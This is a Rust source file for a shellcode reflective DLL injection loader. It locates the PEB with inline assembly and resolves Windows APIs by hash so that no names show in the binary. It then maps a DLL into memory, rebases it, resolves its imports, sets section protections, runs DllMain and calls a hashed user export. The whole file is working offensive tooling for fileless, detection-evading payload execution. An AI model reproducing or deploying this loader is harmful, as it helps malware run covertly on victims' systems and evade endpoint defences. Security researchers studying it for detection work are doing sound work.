use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB, ntpsapi::PEB_LDR_DATA};
use std::{arch::asm, ffi::c_void, mem::size_of};
use windows_sys::{
    core::PCSTR,
    Win32::{
        Foundation::{BOOL, FARPROC, HANDLE, HINSTANCE},
        System::{
            Diagnostics::Debug::{
                IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT,
                IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS64, IMAGE_SCN_MEM_EXECUTE,
                IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
            },
            Memory::{
                MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ,
                PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS,
                PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, VIRTUAL_ALLOCATION_TYPE,
                VIRTUAL_FREE_TYPE,
            },
            SystemServices::{
                DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER,
                IMAGE_EXPORT_DIRECTORY, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR,
                IMAGE_ORDINAL_FLAG64, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW,
            },
            WindowsProgramming::IMAGE_THUNK_DATA64,
        },
    },
};

#[allow(non_camel_case_types)]
type fnLoadLibraryA = unsafe extern "system" fn(lplibfilename: PCSTR) -> HINSTANCE;

#[allow(non_camel_case_types)]
type fnGetProcAddress = unsafe extern "system" fn(hmodule: HINSTANCE, lpprocname: PCSTR) -> FARPROC;

#[allow(non_camel_case_types)]
type fnFlushInstructionCache = unsafe extern "system" fn(
    hprocess: HANDLE,
    lpbaseaddress: *const c_void,
    dwsize: usize,
) -> BOOL;

#[allow(non_camel_case_types)]
type fnVirtualAlloc = unsafe extern "system" fn(
    lpaddress: *const c_void,
    dwsize: usize,
    flallocationtype: VIRTUAL_ALLOCATION_TYPE,
    flprotect: PAGE_PROTECTION_FLAGS,
) -> *mut c_void;

#[allow(non_camel_case_types)]
type fnVirtualProtect = unsafe extern "system" fn(
    lpaddress: *const c_void,
    dwsize: usize,
    flnewprotect: PAGE_PROTECTION_FLAGS,
    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS,
) -> BOOL;

#[allow(non_camel_case_types)]
type fnVirtualFree = unsafe extern "system" fn(
    lpaddress: *mut c_void,
    dwsize: usize,
    dwfreetype: VIRTUAL_FREE_TYPE,
) -> BOOL;

#[allow(non_camel_case_types)]
type fnExitThread = unsafe extern "system" fn(dwexitcode: u32) -> !;

#[allow(non_camel_case_types)]
type fnDllMain =
    unsafe extern "system" fn(module: HINSTANCE, call_reason: u32, reserved: *mut c_void) -> BOOL;

// Function pointers (Thanks B3NNY)
static mut LOAD_LIBRARY_A: Option<fnLoadLibraryA> = None;
static mut GET_PROC_ADDRESS: Option<fnGetProcAddress> = None;
static mut VIRTUAL_ALLOC: Option<fnVirtualAlloc> = None;
static mut VIRTUAL_PROTECT: Option<fnVirtualProtect> = None;
static mut FLUSH_INSTRUCTION_CACHE: Option<fnFlushInstructionCache> = None;
static mut VIRTUAL_FREE: Option<fnVirtualFree> = None;
static mut EXIT_THREAD: Option<fnExitThread> = None;

// User function (Change if parameters are changed)
#[allow(non_camel_case_types)]
type fnUserFunction = unsafe extern "system" fn(a: *mut c_void, b: u32);
static mut USER_FUNCTION: Option<fnUserFunction> = None;

// Hashes generated by hash calculator
const KERNEL32_HASH: u32 = 0x6ddb9555;
const NTDLL_HASH: u32 = 0x1edab0ed;

const LOAD_LIBRARY_A_HASH: u32 = 0xb7072fdb;
const GET_PROC_ADDRESS_HASH: u32 = 0xdecfc1bf;
const VIRTUAL_ALLOC_HASH: u32 = 0x97bc257;
const VIRTUAL_PROTECT_HASH: u32 = 0xe857500d;
const FLUSH_INSTRUCTION_CACHE_HASH: u32 = 0xefb7bf9d;
const VIRTUAL_FREE_HASH: u32 = 0xe144a60e;
const EXIT_THREAD_HASH: u32 = 0xc165d757;

#[allow(dead_code)]
//const SRDI_CLEARHEADER: u32 = 0x1;
#[allow(dead_code)]
const SRDI_CLEARMEMORY: u32 = 0x2;

#[allow(dead_code)]
//const SRDI_OBFUSCATEIMPORTS: u32 = 0x4;
#[allow(dead_code)]
//const SRDI_PASS_SHELLCODE_BASE: u32 = 0x8;

/// Performs a Reflective DLL Injection
#[no_mangle]
pub extern "system" fn reflective_loader(
    image_bytes: *mut c_void,
    user_function_hash: u32,
    user_data: *mut c_void,
    user_data_length: u32,
    _shellcode_base: *mut c_void,
    flags: u32,
) {
    let module_base = image_bytes as usize;

    if module_base == 0 {
        return;
    }

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = unsafe {
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32
    };
    #[cfg(target_arch = "x86_64")]
    let nt_headers = unsafe {
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64
    };

    //
    // Step 1) Load required modules and exports by hash
    //

    if !get_exported_functions_by_hash() {
        return;
    }

    //
    // Step 2) Allocate memory and copy sections and headers into the newly allocated memory
    //

    let new_module_base = unsafe { copy_sections_to_local_process(module_base) };

    if new_module_base.is_null() {
        return;
    }

    unsafe { copy_headers(module_base as _, new_module_base) }; //copy headers (remember to stomp/erase DOS and NT headers later)

    //
    // Step 3) Process image relocations (rebase image)
    //

    unsafe { rebase_image(new_module_base) };

    //
    // Step 4) Process image import table (resolve imports)
    //

    unsafe { resolve_imports(new_module_base) };

    //
    // Step 5) Set protection for each section
    //

    let section_header = unsafe {
        (&(*nt_headers).OptionalHeader as *const _ as usize
            + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
            as *mut IMAGE_SECTION_HEADER
    };

    for i in unsafe { 0..(*nt_headers).FileHeader.NumberOfSections } {
        let mut _protection = 0;
        let mut _old_protection = 0;
        // get a reference to the current _IMAGE_SECTION_HEADER
        let section_header_i = unsafe { &*(section_header.add(i as usize)) };

        // get the pointer to current section header's virtual address
        let destination = unsafe {
            new_module_base
                .cast::<u8>()
                .add(section_header_i.VirtualAddress as usize)
        };

        // get the size of the current section header's data
        let size = section_header_i.SizeOfRawData as usize;

        if section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0 {
            _protection = PAGE_WRITECOPY;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0 {
            _protection = PAGE_READONLY;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0
            && section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0
        {
            _protection = PAGE_READWRITE;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
            _protection = PAGE_EXECUTE;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0
            && section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0
        {
            _protection = PAGE_EXECUTE_WRITECOPY;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0
            && section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0
        {
            _protection = PAGE_EXECUTE_READ;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0
            && section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0
            && section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0
        {
            _protection = PAGE_EXECUTE_READWRITE;
        }

        // Change memory protection for each section
        unsafe {
            VIRTUAL_PROTECT.unwrap()(destination as _, size, _protection, &mut _old_protection)
        };
    }

    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
    unsafe { FLUSH_INSTRUCTION_CACHE.unwrap()(-1 as _, std::ptr::null_mut(), 0) };

    //
    // Step 6) Execute DllMain
    //
    let entry_point = unsafe {
        new_module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize
    };

    #[allow(non_snake_case)]
    let DllMain = unsafe { std::mem::transmute::<_, fnDllMain>(entry_point) };

    unsafe { DllMain(new_module_base as _, DLL_PROCESS_ATTACH, module_base as _) };

    //
    // Step 7) Execute USER_FUNCTION
    //

    // Get USER_FUNCTION export by hash
    let user_function_address =
        unsafe { get_export_by_hash(new_module_base as _, user_function_hash) };

    unsafe {
        USER_FUNCTION = Some(std::mem::transmute::<_, fnUserFunction>(
            user_function_address,
        ))
    };

    // Execute user function with user data and user data length
    unsafe { USER_FUNCTION.unwrap()(user_data, user_data_length) };

    //
    // Step 8) Free memory and exit thread (TODO)
    //

    if flags & SRDI_CLEARMEMORY != 0 {
        // Freeing the shellcode memory itself will crash the process because you we're not resuming execution flow of the program (ret 2 caller)
        // But we can free the memory of the new_module_base from VirtualAlloc because we have finished executing it
        unsafe { VIRTUAL_FREE.unwrap()(new_module_base as _, 0, MEM_RELEASE) };
        // Exit thread won't work because if we exit the current thread then, execution flow will not resume.
        // unsafe { EXIT_THREAD.unwrap()(1) };
    }
}

/// Copy headers into the target memory location
pub unsafe fn copy_headers(module_base: *const u8, new_module_base: *mut c_void) {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    for i in 0..(*nt_headers).OptionalHeader.SizeOfHeaders {
        new_module_base
            .cast::<u8>()
            .add(i as usize)
            .write(module_base.add(i as usize).read());
    }
}

/// Process image relocations (rebase image)
pub unsafe fn rebase_image(module_base: *mut c_void) {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    // Calculate the difference between remote allocated memory region where the image will be loaded and preferred ImageBase (delta)
    let delta = module_base as isize - (*nt_headers).OptionalHeader.ImageBase as isize;

    // Return early if delta is 0
    if delta == 0 {
        return;
    }

    // Resolve the imports of the newly allocated memory region

    // Get a pointer to the first _IMAGE_BASE_RELOCATION
    let mut base_relocation = (module_base as usize
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
            .VirtualAddress as usize) as *mut IMAGE_BASE_RELOCATION;

    // Get the end of _IMAGE_BASE_RELOCATION
    let base_relocation_end = base_relocation as usize
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size
            as usize;

    while (*base_relocation).VirtualAddress != 0u32
        && (*base_relocation).VirtualAddress as usize <= base_relocation_end
        && (*base_relocation).SizeOfBlock != 0u32
    {
        // Get the VirtualAddress, SizeOfBlock and entries count of the current _IMAGE_BASE_RELOCATION block
        let address = (module_base as usize + (*base_relocation).VirtualAddress as usize) as isize;
        let item =
            (base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
        let count = ((*base_relocation).SizeOfBlock as usize
            - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
            / std::mem::size_of::<u16>() as usize;

        for i in 0..count {
            // Get the Type and Offset from the Block Size field of the _IMAGE_BASE_RELOCATION block
            let type_field = (item.offset(i as isize).read() >> 12) as u32;
            let offset = item.offset(i as isize).read() & 0xFFF;

            //IMAGE_REL_BASED_DIR32 does not exist
            //#define IMAGE_REL_BASED_DIR64   10
            if type_field == IMAGE_REL_BASED_DIR64 || type_field == IMAGE_REL_BASED_HIGHLOW {
                // Add the delta to the value of each address where the relocation needs to be performed
                *((address + offset as isize) as *mut isize) += delta;
            }
        }

        // Get a pointer to the next _IMAGE_BASE_RELOCATION
        base_relocation = (base_relocation as usize + (*base_relocation).SizeOfBlock as usize)
            as *mut IMAGE_BASE_RELOCATION;
    }
}

/// Process image import table (resolve imports)
pub unsafe fn resolve_imports(module_base: *mut c_void) {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    // Get a pointer to the first _IMAGE_IMPORT_DESCRIPTOR
    let mut import_directory = (module_base as usize
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
            .VirtualAddress as usize)
        as *mut IMAGE_IMPORT_DESCRIPTOR;

    while (*import_directory).Name != 0x0 {
        // Get the name of the dll in the current _IMAGE_IMPORT_DESCRIPTOR
        let dll_name = (module_base as usize + (*import_directory).Name as usize) as *const i8;

        // Load the DLL in the in the address space of the process by calling the function pointer LoadLibraryA
        let dll_handle = LOAD_LIBRARY_A.unwrap()(dll_name as _);

        // Get a pointer to the Original Thunk or First Thunk via OriginalFirstThunk or FirstThunk
        let mut original_thunk = if (module_base as usize
            + (*import_directory).Anonymous.OriginalFirstThunk as usize)
            != 0
        {
            #[cfg(target_arch = "x86")]
            let orig_thunk = (module_base as usize
                + (*import_directory).Anonymous.OriginalFirstThunk as usize)
                as *mut IMAGE_THUNK_DATA32;
            #[cfg(target_arch = "x86_64")]
            let orig_thunk = (module_base as usize
                + (*import_directory).Anonymous.OriginalFirstThunk as usize)
                as *mut IMAGE_THUNK_DATA64;

            orig_thunk
        } else {
            #[cfg(target_arch = "x86")]
            let thunk = (module_base as usize + (*import_directory).FirstThunk as usize)
                as *mut IMAGE_THUNK_DATA32;
            #[cfg(target_arch = "x86_64")]
            let thunk = (module_base as usize + (*import_directory).FirstThunk as usize)
                as *mut IMAGE_THUNK_DATA64;

            thunk
        };

        #[cfg(target_arch = "x86")]
        let mut thunk = (module_base as usize + (*import_directory).FirstThunk as usize)
            as *mut IMAGE_THUNK_DATA32;
        #[cfg(target_arch = "x86_64")]
        let mut thunk = (module_base as usize + (*import_directory).FirstThunk as usize)
            as *mut IMAGE_THUNK_DATA64;

        while (*original_thunk).u1.Function != 0 {
            // #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0) or #define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)
            #[cfg(target_arch = "x86")]
            let snap_result = ((*original_thunk).u1.Ordinal) & IMAGE_ORDINAL_FLAG32 != 0;
            #[cfg(target_arch = "x86_64")]
            let snap_result = ((*original_thunk).u1.Ordinal) & IMAGE_ORDINAL_FLAG64 != 0;

            if snap_result {
                //#define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff) or #define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
                let fn_ordinal = ((*original_thunk).u1.Ordinal & 0xffff) as *const u8;

                // Retrieve the address of the exported function from the DLL and ovewrite the value of "Function" in IMAGE_THUNK_DATA by calling function pointer GetProcAddress by ordinal
                (*thunk).u1.Function =
                    GET_PROC_ADDRESS.unwrap()(dll_handle, fn_ordinal).unwrap() as _;
            } else {
                // Get a pointer to _IMAGE_IMPORT_BY_NAME
                let thunk_data = (module_base as usize
                    + (*original_thunk).u1.AddressOfData as usize)
                    as *mut IMAGE_IMPORT_BY_NAME;

                // Get a pointer to the function name in the IMAGE_IMPORT_BY_NAME
                let fn_name = (*thunk_data).Name.as_ptr();
                // Retrieve the address of the exported function from the DLL and ovewrite the value of "Function" in IMAGE_THUNK_DATA by calling function pointer GetProcAddress by name
                (*thunk).u1.Function = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_name).unwrap() as _;
                //
            }

            // Increment and get a pointer to the next Thunk and Original Thunk
            thunk = thunk.add(1);
            original_thunk = original_thunk.add(1);
        }

        // Increment and get a pointer to the next _IMAGE_IMPORT_DESCRIPTOR
        import_directory =
            (import_directory as usize + size_of::<IMAGE_IMPORT_DESCRIPTOR>() as usize) as _;
    }
}

/// Copy sections of the dll to a memory location
pub unsafe fn copy_sections_to_local_process(module_base: usize) -> *mut c_void {
    //Vec<u8>

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let image_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
    let preferred_image_base_rva = (*nt_headers).OptionalHeader.ImageBase as *mut c_void;

    // Changed PAGE_EXECUTE_READWRITE to PAGE_READWRITE (This will require extra effort to set protection manually for each section shown in step 5
    let mut new_module_base = VIRTUAL_ALLOC.unwrap()(
        preferred_image_base_rva,
        image_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
    );

    if new_module_base.is_null() {
        new_module_base = VIRTUAL_ALLOC.unwrap()(
            std::ptr::null_mut(),
            image_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        );
    }

    // get a pointer to the _IMAGE_SECTION_HEADER
    let section_header = (&(*nt_headers).OptionalHeader as *const _ as usize
        + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
        as *mut IMAGE_SECTION_HEADER;

    for i in 0..(*nt_headers).FileHeader.NumberOfSections {
        // get a reference to the current _IMAGE_SECTION_HEADER
        let section_header_i = &*(section_header.add(i as usize));

        // get the pointer to current section header's virtual address
        //let destination = image.as_mut_ptr().add(section_header_i.VirtualAddress as usize);
        let destination = new_module_base
            .cast::<u8>()
            .add(section_header_i.VirtualAddress as usize);

        // get a pointer to the current section header's data
        let source = module_base as usize + section_header_i.PointerToRawData as usize;

        // get the size of the current section header's data
        let size = section_header_i.SizeOfRawData as usize;

        // copy section headers into the local process (allocated memory)
        /*
        std::ptr::copy_nonoverlapping(
            source as *const std::os::raw::c_void, // this causes problems if it is winapi::ctypes::c_void but ffi works for ffi
            destination as *mut _,
            size,
        )*/

        let source_data = core::slice::from_raw_parts(source as *const u8, size);

        for x in 0..size {
            let src_data = source_data[x];
            let dest_data = destination.add(x);
            *dest_data = src_data;
        }
    }

    new_module_base
}

/// Gets a pointer to PEB_LDR_DATA
pub fn get_peb_ldr() -> usize {
    let teb: PTEB;
    unsafe {
        #[cfg(target_arch = "x86")]
        asm!("mov {teb}, fs:[0x18]", teb = out(reg) teb);

        #[cfg(target_arch = "x86_64")]
        asm!("mov {teb}, gs:[0x30]", teb = out(reg) teb);
    }

    let teb = unsafe { &mut *teb };
    let peb = unsafe { &mut *teb.ProcessEnvironmentBlock };
    let peb_ldr = peb.Ldr;

    peb_ldr as _
}

/// Gets the modules and module exports by hash and saves their addresses
pub fn get_exported_functions_by_hash() -> bool {
    let kernel32_base = unsafe { get_loaded_module_by_hash(KERNEL32_HASH) };
    let ntdll_base = unsafe { get_loaded_module_by_hash(NTDLL_HASH) };

    if kernel32_base.is_null() || ntdll_base.is_null() {
        return false;
    }

    let loadlibrarya_address = unsafe { get_export_by_hash(kernel32_base, LOAD_LIBRARY_A_HASH) };
    unsafe {
        LOAD_LIBRARY_A = Some(std::mem::transmute::<_, fnLoadLibraryA>(
            loadlibrarya_address,
        ))
    };

    let getprocaddress_address =
        unsafe { get_export_by_hash(kernel32_base, GET_PROC_ADDRESS_HASH) };
    unsafe {
        GET_PROC_ADDRESS = Some(std::mem::transmute::<_, fnGetProcAddress>(
            getprocaddress_address,
        ))
    };

    let virtualalloc_address = unsafe { get_export_by_hash(kernel32_base, VIRTUAL_ALLOC_HASH) };
    unsafe {
        VIRTUAL_ALLOC = Some(std::mem::transmute::<_, fnVirtualAlloc>(
            virtualalloc_address,
        ))
    };

    let virtualprotect_address = unsafe { get_export_by_hash(kernel32_base, VIRTUAL_PROTECT_HASH) };
    unsafe {
        VIRTUAL_PROTECT = Some(std::mem::transmute::<_, fnVirtualProtect>(
            virtualprotect_address,
        ))
    };

    let flushinstructioncache_address =
        unsafe { get_export_by_hash(kernel32_base, FLUSH_INSTRUCTION_CACHE_HASH) };
    unsafe {
        FLUSH_INSTRUCTION_CACHE = Some(std::mem::transmute::<_, fnFlushInstructionCache>(
            flushinstructioncache_address,
        ))
    };

    let virtualfree_address = unsafe { get_export_by_hash(kernel32_base, VIRTUAL_FREE_HASH) };
    unsafe { VIRTUAL_FREE = Some(std::mem::transmute::<_, fnVirtualFree>(virtualfree_address)) };

    let exitthread_address = unsafe { get_export_by_hash(kernel32_base, EXIT_THREAD_HASH) };
    unsafe { EXIT_THREAD = Some(std::mem::transmute::<_, fnExitThread>(exitthread_address)) };

    if loadlibrarya_address == 0
        || getprocaddress_address == 0
        || virtualalloc_address == 0
        || virtualprotect_address == 0
        || flushinstructioncache_address == 0
        || virtualfree_address == 0
        || exitthread_address == 0
    {
        return false;
    }

    return true;
}

/// Gets loaded module by hash
pub unsafe fn get_loaded_module_by_hash(module_hash: u32) -> *mut u8 {
    let peb_ptr_ldr_data = get_peb_ldr() as *mut PEB_LDR_DATA;

    let mut module_list =
        (*peb_ptr_ldr_data).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while !(*module_list).DllBase.is_null() {
        let dll_ptr = (*module_list).BaseDllName.Buffer;
        let dll_length = (*module_list).BaseDllName.Length as usize;

        let dll_name = core::slice::from_raw_parts(dll_ptr as *const u8, dll_length);

        if module_hash == hash(dll_name) {
            return (*module_list).DllBase as _;
        }

        module_list = (*module_list).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
    }

    return std::ptr::null_mut();
}

/// Gets the address of a function by hash
pub unsafe fn get_export_by_hash(module_base: *mut u8, module_name_hash: u32) -> usize {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;

    #[cfg(target_arch = "x86_64")]
    let nt_headers =
        (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = (module_base as usize
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY;

    let names = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNames as usize) as *const u32,
        (*export_directory).NumberOfNames as _,
    );

    let functions = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );

    let ordinals = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize) as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    for i in 0..(*export_directory).NumberOfNames {
        let name_addr = (module_base as usize + names[i as usize] as usize) as *const i8;
        let name_len = get_cstr_len(name_addr as _);
        let name_slice: &[u8] = core::slice::from_raw_parts(name_addr as _, name_len);

        if module_name_hash == hash(name_slice) {
            let ordinal = ordinals[i as usize] as usize;
            return module_base as usize + functions[ordinal] as usize;
        }
    }
    return 0;
}

//credits: janoglezcampos / @httpyxel / yxel
/// Generates a unique hash
pub fn hash(buffer: &[u8]) -> u32 {
    let mut hsh: u32 = 5381;
    let mut iter: usize = 0;
    let mut cur: u8;

    while iter < buffer.len() {
        cur = buffer[iter];
        if cur == 0 {
            iter += 1;
            continue;
        }
        if cur >= ('a' as u8) {
            cur -= 0x20;
        }
        hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
        iter += 1;
    }
    return hsh;
}

//credits: janoglezcampos / @httpyxel / yxel
/// Gets the length of a C String
pub fn get_cstr_len(pointer: *const char) -> usize {
    let mut tmp: u64 = pointer as u64;
    unsafe {
        while *(tmp as *const u8) != 0 {
            tmp += 1;
        }
    }
    (tmp - pointer as u64) as _
}
